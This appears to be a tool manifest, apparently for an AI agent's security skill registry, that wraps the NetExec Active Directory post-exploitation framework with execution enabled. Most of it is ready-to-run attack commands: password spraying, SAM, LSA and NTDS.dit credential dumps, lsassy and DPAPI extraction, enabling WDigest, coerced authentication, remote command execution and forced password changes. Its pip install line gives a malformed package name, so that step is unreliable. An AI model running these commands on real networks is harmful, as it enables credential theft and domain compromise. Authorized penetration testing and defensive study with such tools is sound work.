---
id: security-framework-netexec
namespace: security:framework:netexec
name: "NetExec (formerly CrackMapExec)"
description: Post-exploitation framework for Active Directory assessment that automates
  enumeration, lateral movement, and attack execution against Windows domain networks.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.enum.smb
  - security.enum.ldap
  - security.enum.winrm
  - security.bruteforce.passwordspray
  - security.credential.dump
  - security.lateral.smbexec
  - security.lateral.winrmexec
  - security.ad.ridbrute
  - security.ad.asreproast
  - security.ad.kerberoast
  - security.ad.sessions
  - security.ad.shares
  - security.ad.gmsa
  - security.ad.trusteddelegation
  - security.ad.coerce
  - security.ad.dpapi
platforms:
  - linux
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
  - impacket
  - lsassy
related_tools:
  - impacket
  - bloodhound
  - evil-winrm
artifacts:
  - type: security.credential.dump
    description: Dumped credentials from SAM/LSA/DPAPI
    trust_level: verified
  - type: security.ntds.dump
    description: NTDS.dit dumped domain credentials
    trust_level: verified
contract:
  inputs:
    - type: network.target.ip
      description: Target IP address or hostname
    - type: credential.username
      description: Domain username
    - type: credential.password
      description: Plaintext password
    - type: credential.hash
      description: NTLM hash for pass-the-hash
  outputs:
    - type: security.credential.dump
      description: Extracted credentials
    - type: security.enum.result
      description: Enumeration results (users, groups, shares, sessions)
  side_effects:
    - network_traffic
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 128
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 128
  network: medium
  disk_io: low
allowed-tools:
  - netexec
parameters:
  - name: protocol
    type: string
    required: true
    description: "Protocol to use: smb, ldap, winrm, mssql"
  - name: target
    type: string
    required: true
    description: "Target IP address or CIDR range"
  - name: username
    type: string
    required: false
    description: "Domain username for authentication"
  - name: password
    type: string
    required: false
    description: "Plaintext password for authentication"
  - name: hash
    type: string
    required: false
    description: "NTLM hash for pass-the-hash authentication"
  - name: domain
    type: string
    required: false
    description: "Target domain name"
global_vars:
  target: ip
  username: user
  domain: domain
execution:
  template: "netexec {protocol} {target} -u {username} -p {password}"
  sandbox: execFile
  timeout_seconds: 120
  shell: false
examples:
  - description: "Enumerate SMB hosts, OS versions, and sign-in status"
    command: netexec smb 10.10.10.0/24
  - description: "RID brute force to enumerate domain users"
    command: netexec smb 10.10.10.1 -u guest -p '' --rid-brute
  - description: "Enumerate password policy (null session)"
    command: netexec smb 10.10.10.1 -u '' -p '' --pass-pol
  - description: "Enumerate active sessions on remote hosts"
    command: netexec smb 10.10.10.0/24 -u user -p pass --sessions
  - description: "Enumerate domain users via SAMR"
    command: netexec smb 10.10.10.1 -u user -p pass --users
  - description: "Enumerate domain groups"
    command: netexec smb 10.10.10.1 -u user -p pass --groups
  - description: "Enumerate local groups on target"
    command: netexec smb 10.10.10.1 -u user -p pass --local-groups
  - description: "Enumerate accessible SMB shares"
    command: netexec smb 10.10.10.1 -u user -p pass --shares
  - description: "Enumerate disks via SMB"
    command: netexec smb 10.10.10.1 -u user -p pass --disks
  - description: "List relay candidates (SMB signing disabled)"
    command: netexec smb 10.10.10.0/24 --gen-relay-list relay.txt
  - description: "Enumerate logged-on users via SMB"
    command: netexec smb 10.10.10.0/24 -u user -p pass --loggedon-users
  - description: "LDAP enumeration of domain users"
    command: netexec ldap 10.10.10.1 -u user -p pass --users
  - description: "LDAP AS-REP roasting"
    command: netexec ldap 10.10.10.1 -u user -p pass --asreproast asrep.txt
  - description: "LDAP Kerberoasting"
    command: netexec ldap 10.10.10.1 -u user -p pass --kerberoast kerb.txt
  - description: "Find gMSA accounts"
    command: netexec ldap 10.10.10.1 -u user -p pass --gmsa
  - description: "Find trusted-for-delegation accounts"
    command: netexec ldap 10.10.10.1 -u user -p pass --trusted-for-delegation
  - description: "Password spray against SMB"
    command: netexec smb 10.10.10.0/24 -u users.txt -p 'Password123' --continue-on-success
  - description: "SMB command execution (psexec-style)"
    command: netexec smb 10.10.10.1 -u user -p pass -x whoami
  - description: "Enable WDigest on target"
    command: netexec smb 10.10.10.1 -u user -p pass -M wdigest
  - description: "Dump SAM registry hives"
    command: netexec smb 10.10.10.1 -u admin -p pass --sam
  - description: "Dump LSA secrets"
    command: netexec smb 10.10.10.1 -u admin -p pass --lsa
  - description: "Dump NTDS.dit domain database"
    command: netexec smb 10.10.10.1 -u admin -p pass --ntds
  - description: "Dump credentials with lsassy"
    command: netexec smb 10.10.10.1 -u admin -p pass -M lsassy
  - description: "Extract DPAPI secrets/blobs"
    command: netexec smb 10.10.10.1 -u admin -p pass -M dpapi
  - description: "Timeroasting — extract timestamp hashes from SMB"
    command: netexec smb 10.10.10.1 -u user -p pass -M timeroast
  - description: "Coerce authentication via ms-efsr / coerce_plus"
    command: netexec smb 10.10.10.1 -u user -p pass -M coerce_plus
  - description: "Change AD user password"
    command: netexec smb 10.10.10.1 -u admin -p pass -M change_password -o OLD_PASS=old NEW_PASS=new
  - description: "Get user description fields (often contain passwords)"
    command: netexec smb 10.10.10.1 -u user -p pass -M get-desc-users
  - description: "Find AS-REP roastable accounts with get_user_Password=notrequired"
    command: netexec smb 10.10.10.1 -u user -p pass -M get_user_Password -o PASSWORD=notrequired
references:
  - label: "NetExec GitHub"
    url: "https://github.com/Pennyw0rth/NetExec"
  - label: "CrackMapExec wiki"
    url: "https://wiki.crackmapexec.org/"
techniques:
  - credential-access
  - discovery
  - lateral-movement
  - enumeration
  - privilege-escalation
items:
  - Password
  - Hash
  - NoCreds
services:
  - SMB
  - LDAP
  - WinRM
attack_types:
  - CredentialAccess
  - Discovery
  - LateralMovement
  - PrivilegeEscalation
install:
    - method: pip
      commands:
        - "pip install -netexec-formerly-crackmapexec-"
---

# NetExec (nxc) — AD Post-Exploitation Framework

NetExec (formerly CrackMapExec, abbreviated `nxc`) is a swiss-army knife for Active Directory post-exploitation. It provides protocol-aware enumeration, credential spraying, automatic credential dumping, and lateral movement across SMB, LDAP, WinRM, and more.

## Key Features

- **Protocol support**: SMB, LDAP, WinRM, MSSQL
- **Module system**: Extensible Python modules for custom attack logic
- **Authentication**: Password, NTLM hash, Kerberos tickets
- **Output**: Colored console, JSON, bloodhound-compatible formats

## Common Protocols

| Protocol | Command Prefix | Use Case |
|----------|---------------|----------|
| SMB     | `nxc smb`    | Share enumeration, RID brute, SAM/LSA/DPAPI dump, command exec |
| LDAP    | `nxc ldap`   | User enumeration, AS-REP roast, kerberoast, delegation |
| WinRM   | `nxc winrm`  | Remote command execution via WinRM |
| MSSQL   | `nxc mssql`  | SQL Server enumeration and query execution |
